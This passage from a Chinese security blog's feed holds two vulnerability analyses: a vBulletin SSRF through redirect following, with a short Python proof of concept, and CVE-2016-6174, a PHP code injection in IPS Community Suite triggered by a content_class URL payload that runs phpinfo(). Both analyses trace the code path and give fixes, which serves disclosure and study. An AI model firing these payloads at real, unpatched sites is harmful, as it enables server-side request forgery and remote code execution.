$transport-&gt;response_text : <span class="string">""</span>), <span class="string">'body_file'</span> =&gt; <span class="keyword">$this</span>-&gt;tmpfile));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>首先，在调用该类时触发构造函数，创建我们需要的行的对象，处理拼接后的对象为：<code>vB_vURL_cURL()</code></li><li>之后，使用其中的<code>exec()</code>方法。</li></ul><p>在<code>/upload/core/vb/vurl/curl.php</code>中看到<code>vB_vURL_cURL()</code>类中的<code>exec()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $urlinfo = @vB_String::parseUrl(<span class="keyword">$this</span>-&gt;vurl-&gt;options[VURL_URL]);</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;validateUrl($urlinfo))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> VURL_NEXT;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ......</span><br><span class="line"></span><br><span class="line">  $url = <span class="keyword">$this</span>-&gt;vurl-&gt;options[VURL_URL];</span><br><span class="line"></span><br><span class="line">  $redirectCodes = <span class="keyword">array</span>(<span class="number">301</span>, <span class="number">302</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ($i = $redirect_tries; $i &gt; <span class="number">0</span>; $i--)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;execCurl($url, $isHttps);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">$this</span>-&gt;vurl-&gt;bitoptions &amp; VURL_FOLLOWLOCATION) &amp;&amp; in_array(curl_getinfo(<span class="keyword">$this</span>-&gt;ch, CURLINFO_HTTP_CODE), $redirectCodes))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;closeTempFile();</span><br><span class="line">  <span class="keyword">return</span> VURL_NEXT;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>vB_vURL_cURL()</code>类中的<code>validateUrl()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">validateUrl</span><span class="params">($urlinfo)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">// VBV-11823, only allow http/https schemes</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($urlinfo[<span class="string">'scheme'</span>]) <span class="keyword">OR</span> !in_array(strtolower($urlinfo[<span class="string">'scheme'</span>]), <span class="keyword">array</span>(<span class="string">'http'</span>, <span class="string">'https'</span>)))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// VBV-11823, do not allow localhost and 127.0.0.0/8 range by default</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($urlinfo[<span class="string">'host'</span>]) <span class="keyword">OR</span> preg_match(<span class="string">'#localhost|127\.(\d)+\.(\d)+\.(\d)+#i'</span>, $urlinfo[<span class="string">'host'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    $allowedPorts = <span class="keyword">isset</span>($config[<span class="string">'Misc'</span>][<span class="string">'uploadallowedports'</span>]) ? $config[<span class="string">'Misc'</span>][<span class="string">'uploadallowedports'</span>] : <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (!is_array($allowedPorts))</span><br><span class="line">    &#123;</span><br><span class="line">    $allowedPorts = <span class="keyword">array</span>(<span class="number">80</span>, <span class="number">443</span>, $allowedPorts);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    $allowedPorts = array_merge(<span class="keyword">array</span>(<span class="number">80</span>, <span class="number">443</span>), $allowedPorts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_array($urlinfo[<span class="string">'port'</span>], $allowedPorts))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>首先看到<code>validateUrl()</code>进行了对于<code>$urlinfo</code>数组的过滤：</p><ul><li>不允许<code>127.0.0.0/8</code>这一系列的地址对本地地址或端口的操作，用于防止<code>ssrf</code>攻击</li><li>限制跳转地址访问的端口只能是<code>443</code>和<code>80</code>端口。</li></ul></li><li><p>之后，在<code>exec()</code>中，当我们设置的<code>VURL_FOLLOWLOCATION</code>值为1时，会将跳转信息为<code>301</code>与<code>302</code>的信息设置为允许二次跳转，触发<code>ssrf</code>漏洞。</p></li></ul><h1 id="0x02-漏洞利用："><a href="#0x02-漏洞利用：" class="headerlink" title="0x02 漏洞利用："></a>0x02 漏洞利用：</h1><p>测试poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">u = <span class="string">'vb服务器ip地址'</span></span><br><span class="line">redirect_server = <span class="string">'你的vps'</span></span><br><span class="line">vul_url = u + <span class="string">'/link/getlinkdata'</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'url'</span> : redirect_server</span><br><span class="line">&#125;</span><br><span class="line">r = req.get(vul_url)</span><br><span class="line"><span class="keyword">print</span> vul_url</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line">req.post(vul_url, data=data)</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞修复："><a href="#0x03-漏洞修复：" class="headerlink" title="0x03 漏洞修复："></a>0x03 漏洞修复：</h1><ul><li>将vBulletin升级到最新版本</li></ul><h1 id="0x05-参考："><a href="#0x05-参考：" class="headerlink" title="0x05 参考："></a>0x05 参考：</h1><p><a href="http://legalhackers.com/advisories/vBulletin-SSRF-Vulnerability-Exploit.txt" target="_blank" rel="noopener">http://legalhackers.com/advisories/vBulletin-SSRF-Vulnerability-Exploit.txt</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-漏洞概述：&quot;&gt;&lt;a href=&quot;#0x00-漏洞概述：&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞概述：&quot;&gt;&lt;/a&gt;0x00 漏洞概述：&lt;/h1&gt;&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;p&gt;vBulletin是一个商业论坛程序，它封装了自己的curl用于发出请求。近日研究人员发现在某些版本中其getlinkdata这项功能并没有对跳转进行检测和制止，从而导致SSRF漏洞的产生。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）</title>
    <link href="https://lucifaer.com/2016/08/09/IPS%20Community%20Suite%20%E8%87%AA%E5%8A%A8%E5%8A%A0%E8%BD%BD%E7%9A%84PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-6174%EF%BC%89/"/>
    <id>https://lucifaer.com/2016/08/09/IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）/</id>
    <published>2016-08-09T01:12:00.000Z</published>
    <updated>2018-08-08T16:39:01.781Z</updated>
    
    <content type="html"><![CDATA[<p>最近刚报的一个IPS的漏洞，个人感觉使用性并不是很强，但是审计过程却是很有趣的，拿来分享一下。</p><a id="more"></a><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><h3 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a>1.漏洞信息</h3><p>“IPS Community Suite “是一款国外比较常见的cms。但在其4.1.12.3版本及以下版本，存在PHP代码注入漏洞，该漏洞源于程序未能充分过滤content_class请求参数。远程攻击者可利用该漏洞注入并执行任意PHP代码。</p><h3 id="2-漏洞触发条件："><a href="#2-漏洞触发条件：" class="headerlink" title="2. 漏洞触发条件："></a>2. 漏洞触发条件：</h3><hr><p>IPS版本：&lt;=4.1.12.3</p><p>php环境：&lt;=5.4.24和5.5.0-5.5.8</p><h3 id="3-漏洞复现效果图："><a href="#3-漏洞复现效果图：" class="headerlink" title="3. 漏洞复现效果图："></a>3. 漏洞复现效果图：</h3><hr><p><img src="http://blog.knownsec.com/wp-content/uploads/2016/08/phpinfo.png" alt="phpinfo.png"></p><h3 id="4-漏洞原理图："><a href="#4-漏洞原理图：" class="headerlink" title="4. 漏洞原理图："></a>4. 漏洞原理图：</h3><hr><p><img src="http://blog.knownsec.com/wp-content/uploads/2016/08/ips.png" alt="IPS7.png"></p><h3 id="5-检测poc"><a href="#5-检测poc" class="headerlink" title="5. 检测poc"></a>5. 检测poc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`http:<span class="comment">//[host]/[ips]/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\Fields1&#123;&#125;phpinfo();/*`</span></span><br></pre></td></tr></table></figure><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>首先，在cms的入口<code>index.php</code>中的<code>IPS\Controller\Front::i()</code><br>在调用run方法运行程序时:</p><p><code>IPS\Controller\Front</code></p><p>会作为自动加载类先被<code>init.php</code>中的<code>autoloader()</code>方法所重定向并包含。</p><p>在该过程中会首先包含<code>IPS\Request</code>(<code>/system/Request/Request.php</code>),参数在这里被接收：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IPS\Request Object (</span><br><span class="line"> [_url:<span class="keyword">protected</span>] =&gt; IPS\Http\Url Object (</span><br><span class="line">   [url:<span class="keyword">protected</span>]</span><br><span class="line">   =&gt; http:<span class="comment">//localhost/IPS/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\Fields1&#123;&#125;phpinfo();/*</span></span><br><span class="line">   [data] =&gt; <span class="keyword">Array</span> (</span><br><span class="line">     [scheme] =&gt; http</span><br><span class="line">     [host] =&gt; localhost</span><br><span class="line">     [path] =&gt; /IPS/index.php</span><br><span class="line">     [query] =&gt; app=core&amp;module=system&amp;controller=content&amp;<span class="keyword">do</span>=find&amp;content_class=cms\Fields1&#123;&#125;phpinfo();<span class="comment">/*</span></span><br><span class="line"><span class="comment">     )</span></span><br><span class="line"><span class="comment">     [queryString] =&gt; Array (</span></span><br><span class="line"><span class="comment">       [app] =&gt; core</span></span><br><span class="line"><span class="comment">       [module] =&gt; system</span></span><br><span class="line"><span class="comment">       [controller] =&gt; content</span></span><br><span class="line"><span class="comment">       [do] =&gt; find</span></span><br><span class="line"><span class="comment">       [content_class] =&gt; cms\Fields1&#123;&#125;phpinfo();/* )</span></span><br><span class="line"><span class="comment">       [isInternal] =&gt; 1</span></span><br><span class="line"><span class="comment">       [isFriendly] =&gt;</span></span><br><span class="line"><span class="comment">     )</span></span><br><span class="line"><span class="comment">     [data:protected] =&gt; Array (</span></span><br><span class="line"><span class="comment">       [app] =&gt; core</span></span><br><span class="line"><span class="comment">       [module] =&gt; system</span></span><br><span class="line"><span class="comment">       [controller] =&gt; content</span></span><br><span class="line"><span class="comment">       [do] =&gt; find</span></span><br><span class="line"><span class="comment">       [content_class] =&gt; cms\Fields1&#123;&#125;phpinfo();/*</span></span><br><span class="line"><span class="comment">     )</span></span><br><span class="line"><span class="comment"> )</span></span><br></pre></td></tr></table></figure><p>可以明显的看到url被<code>Request</code>对象中的<code>data</code>数组以键值得形式所接收并存储。</p><p>之后会包含<code>IPS\Dispatcher\Standard</code>，在这个类中，有以下定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;classname = <span class="string">'IPS\\'</span> . <span class="keyword">$this</span>-&gt;application-&gt;directory . <span class="string">'\\modules\\'</span> . <span class="keyword">$this</span>-&gt;controllerLocation . <span class="string">'\\'</span> . <span class="keyword">$this</span>-&gt;module-&gt;key . <span class="string">'\\'</span> . <span class="keyword">$this</span>-&gt;controller;</span><br></pre></td></tr></table></figure><p>会将之前接收的参数拼接成<code>$classname</code>(<code>$classname=IPS\core\modules\front\system</code>)。</p><p>包含执行完毕后在<code>IPS\Dispatcher</code>中调用方法<code>run()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* Init class */</span></span><br><span class="line">  <span class="keyword">if</span>( !class_exists( <span class="keyword">$this</span>-&gt;classname ) )</span><br><span class="line">  &#123;</span><br><span class="line">    \IPS\Output::i()-&gt;error( <span class="string">'page_doesnt_exist'</span>, <span class="string">'2S100/1'</span>, <span class="number">404</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;dispatcherController = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;classname;</span><br><span class="line">  <span class="keyword">if</span>( !( <span class="keyword">$this</span>-&gt;dispatcherController <span class="keyword">instanceof</span> \IPS\Dispatcher\Controller ) )</span><br><span class="line">  &#123;</span><br><span class="line">    \IPS\Output::i()-&gt;error( <span class="string">'page_not_found'</span>, <span class="string">'5S100/3'</span>, <span class="number">500</span>, <span class="string">''</span> );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Execute */</span></span><br><span class="line">  <span class="keyword">$this</span>-&gt;dispatcherController-&gt;execute();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">$this</span>-&gt;finish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到现在的<code>$this-&gt;dispatcherController=IPS\core\modules\front\system</code>。<br>之后判断<code>IPS\core\modules\front\system</code>是否为<code>\IPS\Dispatcher\Controller</code>的子类。</p><p>在<code>/applications/core/modules/front/system/content.php</code>找到<code>IPS\core\modules\front\system</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">IPS</span>\<span class="title">core</span>\<span class="title">modules</span>\<span class="title">front</span>\<span class="title">system</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_content</span> <span class="keyword">extends</span> \<span class="title">IPS</span>\<span class="title">Dispatcher</span>\<span class="title">Controller</span></span></span><br></pre></td></tr></table></figure><p>满足条件，之后便执行<code>execute()</code>方法。</p><p>在<code>/system/Dispatcher/Controller.php</code>中有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func( <span class="keyword">array</span>( <span class="keyword">$this</span>, \IPS\Request::i()-&gt;do ) );</span><br></pre></td></tr></table></figure><p>以上函数就是将<code>execute()</code>函数作为回调函数执行，而<code>execute()</code>函数在<code>/system/Dispatcher/Dispatcher.php</code>中的<code>i()</code>方法执行。<code>i()</code>方法将<code>Controller</code>作为一个静态类名；等同于现在将执行<code>IPS\Dispatcher\Controller</code>中的<code>find()</code>方法也就是执行<code>IPS\core\modules\front\system</code>中的<code>find()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$class = <span class="string">'IPS\\'</span> .implode(<span class="string">'\\'</span>,explode(<span class="string">'_'</span>IPS\Request::i()-&gt;content_class ) );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! class_exists( $class ) <span class="keyword">or</span> ! in_array( <span class="string">'IPS\Content'</span>, class_parents( $class ) ) )</span><br><span class="line">&#123;</span><br><span class="line">\IPS\Output::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/2'</span>, <span class="number">404</span>, <span class="string">''</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对我们传进来的<code>content_class</code>参数进行了处理，处理后的<code>$class</code>为<code>IPS\cms</code>，由于<code>class_exists()</code>函数本身的机制，导致它默认执行<code>__autoload</code>。</p><p>php在底层寻找<code>IPS\cms</code>（<code>/applications/cms/Application.php</code>），<code>$class</code>作为参数被调入其中的<code>spl_autoload_register()</code>函数。其中在：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">14</span> ) === <span class="string">'IPS\cms\Fields'</span> <span class="keyword">and</span> is_numeric( mb_substr( $class, <span class="number">14</span>, <span class="number">1</span> ) ) )</span><br><span class="line">&#123;</span><br><span class="line">  $databaseId = mb_substr( $class, <span class="number">14</span> );</span><br><span class="line">  <span class="keyword">eval</span>( <span class="string">"namespace IPS\\cms; class Fields&#123;$databaseId&#125; extends Fields &#123; public static \$customDatabaseId = $databaseId; &#125;"</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将我们构造的poc的前14个字符截断，与<code>IPS\cms\Fields</code>进行比较，之后判断第15个字符是否为数字或字符串，满足条件后，再将截取前14个字符串之后的值作为<code>$databaseId</code>，也就是：</p><p><code>$databaseId=1{}phpinfo();/*</code></p><p>  将其带入到<code>eval()</code>函数中，造成我们构造的php代码执行。</p><h2 id="三、官方修复分析"><a href="#三、官方修复分析" class="headerlink" title="三、官方修复分析"></a>三、官方修复分析</h2><p>经过我们的分析对比</p><p>发现 ／applications/cms/Application.php这个文件中 原来的<code>spl_autoload_register()</code>和更新后</p><p><img src="http://blog.knownsec.com/wp-content/uploads/2016/08/ips_fix-1024x413.png" alt="ips_fix.png"></p><p>我们可以看到，官方利用<code>intval()</code>函数对最后传入的<code>$class</code>进行来整数验证</p><p>使得传入的<code>$class</code>的第14位后被限定成为一个整数，防止传入字符串进入<code>eval()</code></p><blockquote><p><strong>而升级PHP版本带来的修复是</strong></p></blockquote><p>在<code>PHP</code>的新版本<code>&gt;=5.4.25</code>或者<code>&gt;=5.5.9</code>里变更了<code>class_exists</code>的机制</p><p>而低于的版本则没有此限制可以正常触发漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$class = <span class="string">'IPS'</span> . implode( <span class="string">''</span>, explode( <span class="string">'_'</span>, IPSRequest::i()-&gt;content_class ) );</span><br><span class="line"><span class="keyword">if</span> ( ! class_exists( $class ) <span class="keyword">or</span> ! in_array( <span class="string">'IPSContent'</span>, class_parents( $class ) ) )</span><br><span class="line">&#123;</span><br><span class="line">    IPSOutput::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/2'</span>, <span class="number">404</span>, <span class="string">''</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处</p><p><code>$class=&quot;IPS\cms\Fields1{}phpinfo();/*&quot;</code>的时候不再触发<code>class_exists()</code>去加载</p><p><code>／applications/cms/Application.php</code>中的<code>spl_autoload_register()</code>故不再触发漏洞</p><h2 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h2><ul><li>及时升级程序版本</li><li><code>PHP</code> <code>5.4.x</code>升级至<code>5.4.25</code>以上，<code>5.5.x</code>升级至<code>5.5.9</code>以上</li><li><code>IPS</code> 升级至<code>4.12.3.1</code>以上</li></ul><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p><a href="https://www.seebug.org/vuldb/ssvid-92096" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92096</a></p><p><a href="https://invisionpower.com/" target="_blank" rel="noopener">https://invisionpower.com/</a></p><p><a href="http://windows.php.net/downloads/releases/archives/" target="_blank" rel="noopener">http://windows.php.net/downloads/releases/archives/</a></p><p><a href="http://karmainsecurity.com/KIS-2016-11" target="_blank" rel="noopener">http://karmainsecurity.com/KIS-2016-11</a></p><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6174" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6174</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近刚报的一个IPS的漏洞，个人感觉使用性并不是很强，但是审计过程却是很有趣的，拿来分享一下。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
